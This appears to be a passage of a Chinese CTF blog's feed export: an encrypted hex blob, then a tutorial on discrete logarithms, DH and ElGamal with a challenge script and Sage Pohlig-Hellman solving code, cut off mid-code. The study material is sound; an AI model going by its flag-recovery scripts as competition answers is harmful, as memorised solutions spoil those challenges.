d5180cdf069dace5ef8d7686b5f6a865021138f4a110eee4fcbb9c364497488f6427ac1f1bacdd4d18073ca24e49e46bc39da929113d14627c7a092c5ced83951a2c3de14ea9349f29c46bf5939b47fe2ae5520cc08ab06decf67c6dfe097c6772b013075167cf3e2a187f7b0c6d325f4eb8f8672bc2250c6787dac5c2ae325f355ebc851ef569a85e2034c6cbfc1203030acd5bfc9f693d2f6a02e1ac1cd5f22b25b666af865992d842b71eb324094f746e0080f96a5af30b129464d9e89be2f3cb12e86f2afc24761a753f9e6070bfd106d7655c5ce16e407e4a303483d0d6b4c5a1805ef83d4109312f2a3e5d75360359d81ddb074cf940183b99e69c8251d7cfe64c18faa9ba82a3cdb9e87ecc91ff9c45bef4b7258259e5eec220a692c6e9d1d74d6ec579bc25723e92bcac220e0e924274011da938b8978cbfcaa6310ebca8b9f874262c3740e6ee7daeab36b2e58d6a58ebee10b76c112c7ce4132352a229879743b300d75cea0af34943fe1bf65f344a38e1175fda86184aa6db2b5f5956e3a98a6d49eda32a80396a147d5828d156390421c339813d4fdcbc89c0897e9eb29f03639097b5cc9e108ae97a4a16483d5ee34f6914598304b5389209258f89bd7860e6dae46b45ce7022e9bea00e0b0c04bd40e64ae0ae591eeb13c6a832eab258b7b602abb01b7991edc9cda34837fd640bce2d5f82742203ed7393172dc250a5e7f61ef94f4c52bba136ef7650509da3ffa10ed90bc1bda75d73e76e6ed7de3d149c2fde9990f873f89fe9bfe18e231ae3aeb03a1acb3e002177acd135b2f5a9b53aa746834dbe254eb56f950937d69e7856538dae86a66b668304afb247fe564bb72f7e116d33ea644548112152096617e32ed4b22bffa1e9402067bd1ef2da176575f42f507afee6d9cc9130c7f291fd1c300f1bcc5a22ba3a73e687e626354041a4c8b4f4d32c91fe9d7fa2f495497bc9fb6cc8b93fadd9eed44fde45c2f43f8ccd331d9f26d7b8f4cf672b1f445a1925958bfdc1fbfba9fdf82147d83a5c5a9075dce6e484fc91b74ab90fb4a381c44604e576a6280ee61c5cdb283441fdba95b3f01565788e162b25212eded2a1af210fb670f9dd84d15f1b96465daae93c62e54dbd2cd36e7bd77aa2b3ebb782272f02ceff3b97b57d789a3e6e8d1fa978a19b38a067a302a915fb6210ed50ac6d4ec1878cc59199b80f2d537ecb1880cec76a246ff0c485c126dfd5d5795988a6b28c47dafddfe57dea92968ad29feefe5a085405bd7246648d4c62481051feedc66221a7fcc0fa32e446445f1dd21a42c5c6fa2ddfb2c61dc0c85644747c65bda113940739902b9ace45cdf0e2acea03daa410180be4800d8e02191b1b9eb43021f52cfb1029fb1d8d285c91a4e5f2695183c8dfa46b3d35103f6be1966abcb86e99d35bb9190e099e7623afcd762a153f57f044d7c08c345c370cf2ea269a584c3ab52f68bc2f180fae8765ed5cb44251208693599ab565658507bce53d3b493bc4535c06fcf0980a39e7bae0b8fc90cbd1c3f534243dc38b0bfcebdb125de01a618aaf50ebe6dbba8a62bc9f23048b205f00f97560f8a18d6a260b3f77e2486022dd4091aaa6d089bb13e1a14b5846d44c6bff4706a20c4de9d4b2daa3ad6969bd45888880890b6c767e682444181bfcdf3369f9eb7df4478e3b121fbdc4c7460c4147b65fc2c187444f5dacb1a9ca5bf15258b5c14d062bfb655b43a5fe07fb71b8449ab1a9cda27483fbe0ae43c404bd79396c56eb4d4470e1b2f6b9ca1be5b23998dac97aa92bc72d823a105e33b45558a9e67be64178cd150d7ef522c32c84794b603cadbaa3d194b708fc8056f3f3bcef111e3e9b884d56999ddd165a6b631ee425098aa2f09a23b69ccbc9cc989e84540df621115ccd5694e7902eb953ab4a518adfbebb48028b6891928807b086916497ed73bf2cc76320fe8716fde2527bc849aa4a8925efd9b6cf59f86ed0e8f3b7e5827188f409ce9657dbf25f17199b8ea2587d9707b9c3c6808214ff5fb666de11d24793575c98fcdd1c734aab8b0d651ecd4c8f92a78c3190e35ac647b9174722f9222cea61048a5091ee9ffe53445672f9181bc6a45f31093faa3aff3ffa59fcbd059bade822d8ed625701b517893c0952cb6c896c3f5417272437a74e951de149471bff52dbe61be2ee2082efd7972f68a2265d6f03889ebbd8604fbf191f1b9f56297ea6e27840c76d3a5f286fc7117e02032c0452a03d0c61dc36b36cac54292e6c991fdf27053462b4482d52fff1ebbbe043f4d7363b8c6e90706b5d59d52a7edaf24840cb59c0c81436a9e9d95a49e38c268c484f04e2d0dbd04fec97620cfec8041c70aa09691abd69313ee96397fa155627e174ba5dc4123faf0416893f1d05f3db6191fe0406378dc80f79c30f266cee6355d0c47d0fa29e9062bd4c3ed0391a0416724187f8140a82bbdf9df485c138cc7ee8257ceaaebc8f388ea92ed1323f21fdae7da9667784bbc9763cfe5c585f1bc4c7b122d1fdede089cd208267603cfa899ec8f3c3fa0af28aa85dd1be14d20b6f71f57a2ec9c48760b76e63fa4d67d0025bfa4406e9f10b3d1c2fe3fb86fbe26ebeac2d0e45c223894afb865a78e9f5a58a3a0858652da3652e084402df3cbd8961985271609a93f84ff9929e58af1877a27c4c49bc5ac9ad90ed43c62191f9325316b47a57f77a2a392635a3cdf63ee3d8ab8813f169e165c41dd178a78976b5ac005d4b7d7cae9efb945121e6c2b43aae2384fdad4898e3c1c4d7d2f774a7615cdab3bac352f34d40d1eae5b437ec977a1e8e3a2afb6622fb614b7520f747861441890acd51d4d29de3d0aaef59fb37efd9a65fdec79db8c88b9e63364a53fb46df56ee95f55ec5a2028c8e5ef3a28f098fb06c1b02031f6b3cedc98373f429d4faab4647772bef89ada5a1c1f4c324fcb74ef351fa707d1cdcd2677d4447822287d5dbf2343db977ae408e052ac0ebaa3446fea71f56fb7b8db69b6ea94c16da2e7cc68e575436d9862af1693b6c1fa9c7c69e32a7b8b4e4b9f865ceb35a55bd2561c6b3f32625f1450f7c3d373ee5e62546b92c743c2d0a4f93edb895a6efa5ef760ffe7e4d0168de278bf788be9357971793916ae00bb5a1fa143283120c28ff7601092dcae25a61e3df5b4f178222ecd05e06844284334b72d2712f66670fa49334a56c7c7b1f3ffd5a286f3c0b0889c7b859fdb10128e5a771556f29b6369f40793d2cfff2f01b47a22a9ca331b85e69e24c5716a208be9f2ca881168dc27c1ce15824e5efaa8e4529c05cb45bbfa12ee1ae8b6c3cafd91514650a4d721240e307563d2aa0876572b92743ef93a37e3c196ac2433c85e50c3180b8394e1a13e0e2afa707dfee51ca37057e650d673b7b25cfe1353ecd93cb4e90d135feec9e6d486c24f4bbf989c493022aaa74fcd90af15e20997c4ff1a436fc991fe782bda8a3edcee92fb450645a8769a3d62bf8ded924bfcb61ad87d05c3544e8d5ccc3cdb1dbc9837d7ddcfcb1717dbc555fe0d5ed939cdbb1dc177fc8dd86a8eedcee09cd8cc787f9a77ede838da9c7e30ebc3f1c963ef6be33521ba5924591ae876c9c5a53c42ea9633ef7e742435739b79e59f7e25d0cbb09ea2aa1fdd29aafe92596517a8d85dd56a99384b6cd6563d9c54c3483ee5394bc5ed2209e033203c6287f4b122b228b1e1103e8404a43f17e58ba7dfa0f0fe9eb56764f930afc53dafdac44bc66469b5c31670b29fe71c6bea6c6c77fd270a43e04652b826fa438673c9823060017623ef43f3b75eaaed1bf91edbe9921cf2febf8209ebdd5853b664fe33692cb399afc9d0caff566de8dba1df87da25870830d2c25d9ce9c558c792ad5a47188327d774945848f87c2fe7e03914a06f348c3546cc848c17b6659e13aa40ae4af48c315b7e056565c7f3f052de24a9accc908b1a3de809bda022bb487d73eaf8d868f18aae269e768cb27e9c6c1ef5b80c2a5ca21b77319e348d9b74fbcbda68153f4263a7bda89530d0763a644feed765d874152deb0523fc036658100f7188a4b37cce6217beb24a376edcca6dab67d46654bf747a9fa6b59f90f26b1dfd0e1868accc136d334714d87bcf026987d6e0e37b3f6d5791011ba6bfe8439cee75374beab6eb3b39200e66f9ad5ebd89200afe1aeecf2833c14f7e375b52d6995f04e1f6ce6f083011a8a8d8eaad048660b365f43147b014c3aea5f85bcd27f68e28b33f7db93a90cec3131e5bd13c07b4712f0568422311675cd67e07c7d39c04f7d6d6f20c006f438ed3917ad2a2f9aba5f7431eeb8f70a27f0c1d731117141960f271674d3047e9b1376a18ad7018ef46cee0fb3fd12f07f8af8b43082c07df47601e7ceb1444c1ec791a8b5eb9df875554d6a430639e772fcb732d190719c791e087114fe9041c908e0cfe684420ba3e7a62aff70fb4fac66d10425a02c0a2533bb55fd8ecdd0d47b17b4740cb6c8da713c26714d7e8d492e39293c1f77b94c9ea6accfeb014cc753a6e4e5661e3850b590a93c83975385627558c4dc43d6ef876469f3ac48b564b585eff5c86953221523fdcf9f5ef25502c07a359694bceb4adf21f49707b2c6886d844740af3b9c1c88addcbd13906fad5831a2e3d78256b70e7f6b0bc5e8661d2151e3be2909b799d8613431d24c7f81440358185c202cced268a6edf21c5c49f992cfe6e6154ef03e3806e844d8ddab3f237e469ef51f4c5b2aea7528801fbb3b56bde94af51d86b408f092bc08f8f7bb7b03cab05b299889e12c7cb8382130e745229756454f3969905dbe6ad0efc83bd29a172925b226530713daa07c07fcb14e5c2c151471a725549afbe1615ed4935f5c66343bf40cefb3b77c145e4a7a286d405fa8d5f20d2c591a62b10a1128a90e59893974ae03998d27bac1fee8abd6622e0e5ab574ff5467f32aeb617cff66b6b8e1ecba80c2df6cddf787cfaff91d4a07ba9dc688dd5afe5882173e83647107e9d8831eb5790aeea5711303e682a6d06402c544ac3a80efb7523976ac14139ab7ff55ef83f41998c918f31e8a309c651e6008e7fa8e973b434ef145af7ce6e9a3f0a9f4ad336860b0d99e7e8fae72e8e60efad787308280ad59d31323be843f41a67a6cb1d2d1eb1e6c0a4bd7031820654513bc9f018983c64d94900c03c29ebd9a633765ff13ab26a3e3569103cad5c04b7605319dd2daaa8b0a24109bcad272a49e573163e00257610f31c0c322b551c7e6ad4110eac4e4b298c23229741547ccb8da965f60922c521d9522e628934b9e418991e89b2dda5de676be6e3fb4297ae5ee98c3fedf0704f015c47efcabf93cb8bdd3c1ece549798aa65d23cc3d5deae9c2e693d7a9dba7d21efb327fec9a06123a99459156ce9c6150ad851c1b7d90fa4eab40ce7cdfe28bbc91bbc0be36e689a5c8394081c2310c894d3fbc94a5b157620af9aefccd0053babad60b416a57a5eaa8caa9fb84b1d4b4d5590b5fb17cff4cd91d6e06b32214a514201ee8283b1674b750dcb459d50d5788641e5bca029af833fadfdf5d21cb8a63da954263c7306787767f1bb5b12491a21b653c854eaa7b1642fba4b7f87311e1eb3afa3397939d7e6fa6610639e0c9e42dbc74709e39cdc1a418fae56e003797e8820d00cb01ac2aa81740ea69b5a80e456df680b609e0874d1dc26fb746140ab9379ba1d0c149b2f66fd038b8e9b088079a126e03611dfee74e269424281b2085725d9f1fc7dd648bcdff2fff9f58ab2edb4892cff65c93c1303ddbd8cac3ff4ae23a7ae4ee743cc1f91f57328e941dd79bf68696aa15926017f81c06fcf84ae31a6bd9711f26c1c2b28eaed2a3203577512bb471f3c4168224483dba5038c3a037b405c7b8e2bb3d31e86ff3a9978a4ab279ff8f10bf49579579307a20ee56352eb1fa1aff49a2a5da7fe823c98825ec6827a60d9716b811d67594695ebb0528f5c95dc6618441309bc54fc0d4045c78f77b42992aacd407bb0d799cb8d2695c9ac4b85c573911325d5bb32472d087d26728a4684d9efc1055a08e67a6b2c4fd68493947722650ca9c693be2628811c66358739b89abb63f571e13b9bee0dafa0b188f2c8efe1b8f72cce58fbbcebcd186bfa885d5967b8bf5b85a79246b70da172938c9756b399ed49bcf7456d469c0cf33850c4cfcd28187a88862701bfc898286cb09f65980c577eab070b883a1931063c1b01d1fc77b80e9f62bc257b8e82aaf97b9c4440c320ff77062cbac227ab9a77e38602c4edf853f29d88ffb0d9b74722a2948cf69165c130dcd539674a0e29c0a5d8820b9806f0deaa40a95025604d936c510017a6f569534cde237ffbc8c42d59540d1688271e82e29d9df7aea9dec6b20179524459257f000b3122d2e82486050f33f31df226967ebf5641361557e22ab5cb15a7c6896fa76d61541e2a1e21377d0355ed46d4a396f3f79e811907d91e1b293e4380814542e4eb7597c1fbe2a44bb8bfdd59c2410c54389526134edc00215dc349e7619774d12741bd323d21e25a7c5bccdaba6535dd52859d4ab7caee704358c1aa32161c34bb0e28cae28e87dafb503bb6baf4bd8bac82f0c5751fbee4107f0d33d5c3a87fa86cb63e001a72ac6a588678a0a525dbe9d08ab051c8325a7da4ff0838f1fa488d694484fe97f112d50d0ca902a93a28519fff910c8a551e21530ebe00a2531ae2d1fc6c0600a082a20390daca5e837a56a94d9332643b646949bc3a6076f8c2a37ff68ebfb557a6c70d9a07db421ff49bb81dca74da2724df41870d01b032bbd63c1753a648100fc178ae852f35fa022f566c6767006e8d7a467cb9c8b8b1b3e9eb984dc97e085540665d35a86d3cce9584f648da012b604e8b068e289812195454bdcb9bb2d8617c979db6c15308fd3c05c95d70e243390c4956a15d8515d2a0546e39acf7e4184232e34b04a8335b0b964491e8b9db991fe8da21f72223c3fcce4394b998e9991981e7b9c23a384f57176f629c58d170326342c09f0c70f2b5bc783f98f64e298db74010e4527891b5365aea65781fdac8801f37fdf2ba98371bb166d4b937c033d1b51895de37cfb2158a26c8d12b6571de9a21c97161b8105dc948df5a53dc037af20aed71cf70d126cd8caf8eb0eaa6f337746f04d87cee2d2575f2b89e7945fe44cb614da338cec0c047cfecac1e64beb9b4df19d3c32a2b631dc0e54f9fef2ba6a5bdac8f591a85260ad589f9348552ebee7b1bd7c4282980895b6ddcb86ae6add7f5c623fcdb386898a6d8c081c0d62a2435db6bdb53ab0d8184b3c1b4aee2825f0b4072fce72630b438241bd9a08c0eb4b193225508e836c0151a1ccef03c6ffa957149b4678cd102786926ddb2e57b83e0125f68557004d4d95703fbac81d746ae8f0c13cee541686e6f3194032c799bba5859986acc780182b4a9a0afb4f1f28a3a54365b88de9cb9e724205fdd33a364ada96222a3b90fbd94f7e0b27173414dff2061e07df9403bdc23eea6035788a04e61556289a25c2f9188c1414c63f686871dd6647d246ff4f98a3d41f87b715ae90f3f0e61ae4b22792952aa7de8ed117d414073178e83c3ed159a672d8ee882937a404ebe82db59fc2cf46236902cf83fa1805dd8d7d998056e9b59a5fb9f7a4e4b3dd0a5844c8753652a297d23d3aa6253e10e729cf24aaf43ff7536e1623128d39cfe0354d9f3c290c1695f8e4c11dad8091d7f0d3911737e792b15aff0325d38ed9f4aaeed3836349fed9a563235363cde212fcffe15eaba7e863adbc2a92ea3ec7f6ed7eaa4ab5e6f21b1a1a1c27a1c296945c2247b504752dab3d59c6fc308bed4f8b1b863663c376dac5cb7a5ed5db821f52df176c9cada6c5bdc3c494905410d8c2c9b7ea9da31a8460d6bffdd6027d7e359556062603cc62b18efe6ec76c2e7ce73201145e6e1e0d6efba256e29c160d3d376dae7f9ad921b4cba3a08daa30b0f3976f69d321aebc553e08378d12ec408b99fcb2a11674e2d7d595858075eef99476769a255be022a6f78ddc6520d7aea17cfe55f30e659d67407fa19ddec6c07e32d2a2099f2e2a7333a7021ceb3a12785d1f73006866cbd1e36f06c8457c76e307710c4baf6c6f25abc2a5a4149f2d5fd39b7b709088d3a040fce0790900eef0ac0a1fe4abf718484053773e8ace252eedb15195a1b2dc111cf43780fbf0f1cd36b4e9064776137632589fe0a67a4c1f108472d882dad3a4572a2655a01c5a81de02ee5bb5d4d772e13245606a02db152043189e84fdde2a4ff64dbb2c1f18b995c2e8990bbf6b3d5818d2398a40581253956eb179ae834f4269d6d8863494dd72d9cd47a8e2dceb1183f987153432248fe4c34e7cc2dad23f6adf81e2bb599514f2c2285421b8f88edbc97a277e5c5802b9a3398d61c4267b45974ce520d9cef1ca9a22763c571a35d50d5c67c5a254cb6d03e4e2f99ac2ee44eb390d39df741442e7eb0b0beb14cdbbb771a93a39a3a27e2b797ef3b88b5f9c4760e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散对数 ｜ DH ｜ ElGamal</title>
      <link href="/2022/05/11/%E7%A6%BB%E6%95%A3%C2%B7DH%C2%B7Elgamal/"/>
      <url>/2022/05/11/%E7%A6%BB%E6%95%A3%C2%B7DH%C2%B7Elgamal/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><strong>注意：若公式显示不全，请您点击它以全部显示</strong></li></ul><h1 id="离散对数-｜-DH-｜-ElGamal"><a href="#离散对数-｜-DH-｜-ElGamal" class="headerlink" title="离散对数 ｜ DH ｜ ElGamal"></a>离散对数 ｜ DH ｜ ElGamal</h1><h2 id="学习参考"><a href="#学习参考" class="headerlink" title="学习参考"></a>学习参考</h2><ul><li><a href="https://4xwi11.github.io/posts/898249b7/#more">4XWi11师傅</a></li><li><a href="https://lazzzaro.github.io/2020/05/07/crypto-离散对数/">lazzaro师傅</a></li><li><a href="https://www.ruanx.net/pohlig-hellman/">Pion1eer师傅</a></li><li><a href="https://zhuanlan.zhihu.com/p/132603308">pecco</a></li></ul><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>DH 和 ElGamal都是基于<strong>离散对数</strong>问题的。</p><h3 id="离散对数（Discrete-Logarithm）"><a href="#离散对数（Discrete-Logarithm）" class="headerlink" title="离散对数（Discrete Logarithm）"></a>离散对数（Discrete Logarithm）</h3><blockquote><p>在任何群G中可为所有整数k定义一个幂数为$b^k$，而离散对数$loga^{b}$是指使得 $b^{k}=a$的整数k。离散对数在一些特殊情况下可以快速计算。</p><p>而公钥密码学中几个加密算法的陷门是基于寻找离散对数的解的困难。</p></blockquote><h4 id="生成元"><a href="#生成元" class="headerlink" title="生成元"></a><strong>生成元</strong></h4><p>在一个群 G 中，如果 g 是 G 的生成元，即所有 G 中的所有元素都可以被表示成 $y=g^x$，此时的 x 称为 y 在 G 中的对数。</p><h4 id="阶"><a href="#阶" class="headerlink" title="阶"></a>阶</h4><p>设 m≥1,gcd(a,m)=1，使得 $a^d≡1(\mod m)$ 成立的最小正整数 d 称为 a 对模 m 的阶。一般将其计为 δm(a)。</p><p><strong>满足 $a^d≡1(\mod m) $的 d 一定满足 d∣φ(m)</strong></p><h4 id="原根¶"><a href="#原根¶" class="headerlink" title="原根¶"></a>原根¶</h4><p>当 δm(a)=φ(m) 时，称 <strong>a</strong> 是模 m 的<strong>原根</strong>，简称 m 的原根。</p><p>只有$ m=2,4,p^α,2p^α$（p 为奇素数，α 为正整数）时，模 m 的剩余系存在原根。（充要条件）</p><h4 id="以题代入"><a href="#以题代入" class="headerlink" title="以题代入"></a><strong>以题代入</strong></h4><h5 id="2020网鼎杯-青龙组-you-raise-me-up"><a href="#2020网鼎杯-青龙组-you-raise-me-up" class="headerlink" title="2020网鼎杯-青龙组-you raise me up"></a>2020网鼎杯-青龙组-you raise me up</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure><p>可知，flag被当作e了，即：$c = m^{flag} \mod n$</p><p>那朴素的想，这里最直接的方法就是求出在mod n的前提下，求出$\log{m}^{c}$</p><ul><li><p>看到<code>n = 2**512</code>,则：phi= 2**511</p><p>即：phi易求</p></li></ul><hr><h4 id="离散对数分解问题（DLP）"><a href="#离散对数分解问题（DLP）" class="headerlink" title="离散对数分解问题（DLP）"></a>离散对数分解问题（DLP）</h4><p><strong>sage</strong>中的DLP相关函数</p><p><strong>参数说明：</strong></p><ul><li>求解以<code>base</code>为底</li><li><code>a</code>的对数</li><li><code>ord</code>为<code>base</code>的阶，可以忽略</li><li><code>operation</code>可以是<code>+</code>与<code>*</code>，默认为<code>*</code></li><li><code>bounds</code>是一个区间<code>(ld,ud)</code>，需要保证所计算的对数在此区间内</li></ul><p><strong>函数使用</strong></p><ul><li><p><code>discrete_log(a,base,ord,operation)</code></p><p>通用的求离散对数的方法（Pohlig-Hellman+?BSGS）</p><p><strong>(但没有bounds！)</strong></p><p><strong>Pohig-Hellman</strong>算法是一种<strong>求解光滑阶循环群上的离散对数</strong>的方法。</p><ul><li>要求$a≡g^x(\mod p)$中 <strong>g必须是原根</strong> （对于 g 不是原根的情况，需要利用原根将原方程转化成两个关于原根的离散对数问题。</li><li>要求<strong>阶是光滑的</strong>（p-1可拆为多个素数相乘）</li></ul></li><li><p><code>discrete_log_rho(a,base,ord,operation)</code></p><p>求离散对数的<strong>Pollard-Rho算法</strong></p><p>Pollard Rho算法是一种<strong>随机性的概率型算法</strong></p><ul><li><p>它主要解决有限的循环群上的离散对数问题。</p></li><li><p>Pollard Rho算法主要就是利用了循环群的生成序列呈现一个 ρ 字形状。</p></li><li><p>适用于<strong>生成元的阶的素因子都是大数</strong>的情形</p></li></ul></li><li><p><code>discrete_log_lambda(a,base,bounds,operation)</code></p><p>求离散对数的<strong>Pollard-kangaroo</strong>算法（<strong>lambda算法</strong>）</p><ul><li>适用于题目给出bound</li></ul></li><li><p><code>bsgs(base,a,bounds,operation)</code></p><p><strong>大步小步法</strong></p><p><code>from sage.groups.generic import bsgs</code></p><ul><li>用于解高次同余方程的问题</li><li>适用于<strong>模p 为质数</strong>的情况</li><li>适用于题目给出bound</li></ul><p><strong>原理介绍</strong></p><p>对求解离散对数问题$g^x ≡ h (\mod p)$，有</p><p>$x = aT+b$, 找 T接近$\sqrt{\text{ord}(g)}$, 则：$g^{aT} ≡ h*g^{-b} (\mod p)$</p><p>复杂度为$O\left (\sqrt{\text{ord}(g)} \right )$的<em>meet in the middle</em>.</p><p><strong>优化</strong></p><p>设$\text{ord}(g) = N = q_1 ^ {e_1} \cdot q_2 ^ {e_2} \cdots q_t ^ {e_t}$,又$g^N ≡ 1 (\mod p)$,有：$r_i = N \bmod q_i ^ {e_i}$</p><p>记$Q_i = q_i ^ {e_i}$,则：<br>$$<br>\begin{aligned}h ^ {\frac{N}{Q_i}} &amp;= (g ^ x) ^ {\frac{N}{Q_i}} \\ &amp;= g ^ {k_i N} \cdot g ^ {r_i \frac{N}{Q_i}} \\ &amp;=  \big (g ^ \frac{N}{Q_i}\big)^{r_i }\end{aligned}<br>$$<br>将复杂度为$O\left (\sqrt{\text{ord}(g)} \right )$的离散对数问题，转为多个复杂度分别为$O\left (\sqrt{q_i ^ {e_i}} \right )$（$\text ord\big (g ^ \frac{N}{Q_i}\big)$）的离散对数问题</p><p>分别求解出$r_i$后<strong>CRT</strong>得到$x$ (根据x的大小范围可以减少离散对数问题求解数)，总复杂度为$O\left(\sum _{i=1} ^ t \sqrt{q _i ^ {e _ i}} + \log N\right)$</p></li><li><p>多项式DLP(暂未见到题，没什么了解)</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#Sage</span><br><span class="line">def brute<span class="constructor">_dlp(<span class="params">gi</span>, <span class="params">ci</span>, <span class="params">n</span>, <span class="params">lim</span>)</span>:</span><br><span class="line">bi = gi</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, lim+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> bi<span class="operator"> == </span>ci:</span><br><span class="line">return i</span><br><span class="line">bi = (bi<span class="operator"> * </span>gi) % n</span><br><span class="line">print(<span class="string">&quot;[-] NOT in the range&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[-] Something&#x27;s Wrong, you gotta check the range&quot;</span>, lim)</span><br><span class="line"></span><br><span class="line">def pohlig<span class="constructor">_hellman(<span class="params">g</span>, <span class="params">c</span>, <span class="params">s</span>, <span class="params">n</span>, <span class="params">factors</span>)</span>:</span><br><span class="line">res = <span class="literal">[]</span></span><br><span class="line">modulus = <span class="literal">[]</span></span><br><span class="line"><span class="keyword">for</span> q, e <span class="keyword">in</span> factors:</span><br><span class="line"><span class="keyword">assert</span> pow(g, s<span class="comment">//(q**e), n) != 1</span></span><br><span class="line">gi = pow(g, s<span class="comment">//(q**e), n)</span></span><br><span class="line">ci = pow(c, s<span class="comment">//(q**e), n)</span></span><br><span class="line">dlogi = brute<span class="constructor">_dlp(<span class="params">gi</span>, <span class="params">ci</span>, <span class="params">n</span>, <span class="params">q</span><span class="operator">**</span><span class="params">e</span>)</span></span><br><span class="line">print(<span class="string">&quot;[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;</span>.format(q**e, dlogi))</span><br><span class="line">res.append(dlogi)</span><br><span class="line">modulus.append(q**e)</span><br><span class="line">print(<span class="string">&quot;\n[*] res = &quot;</span>, res)</span><br><span class="line">print(<span class="string">&quot;[*] modulus = &quot;</span>, modulus)</span><br><span class="line">dlog = <span class="constructor">CRT(<span class="params">res</span>, <span class="params">modulus</span>)</span></span><br><span class="line">print(<span class="string">&quot;\n[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;</span>.format(prod(modulus), dlog))</span><br><span class="line">return dlog</span><br><span class="line"></span><br><span class="line">p = </span><br><span class="line">P = <span class="constructor">PolynomialRing(Zmod(<span class="params">p</span>)</span>, name=<span class="character">&#x27;x&#x27;</span>)</span><br><span class="line">x = <span class="module-access"><span class="module"><span class="identifier">P</span>.</span></span>gen<span class="literal">()</span></span><br><span class="line">n = </span><br><span class="line">g = </span><br><span class="line">nfactors = n.factor<span class="literal">()</span></span><br><span class="line">s = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nfactors:</span><br><span class="line">s *= p**(i<span class="literal">[<span class="number">0</span>]</span>.degree<span class="literal">()</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line">print(factor(s))</span><br><span class="line">qe = </span><br><span class="line">dlog = pohlig<span class="constructor">_hellman(<span class="params">g</span>, <span class="params">c</span>, <span class="params">s</span>, <span class="params">n</span>, <span class="params">qe</span>)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(hex(dlog)<span class="literal">[<span class="number">2</span>:]</span>)</span><br><span class="line">print(<span class="string">&quot;\n[*] flag = &quot;</span>, flag.decode<span class="literal">()</span>)</span><br></pre></td></tr></table></figure></li></ul><p><strong>实例</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#生成<span class="number">64</span>位的素数p作为模数，<span class="built_in">int</span>为<span class="number">32</span>位，超过<span class="built_in">int</span>要在数字后加L</span><br><span class="line">p=random<span class="constructor">_prime(2L<span class="operator">**</span>64)</span></span><br><span class="line"> </span><br><span class="line">#定义有限域<span class="constructor">GF(<span class="params">p</span>)</span></span><br><span 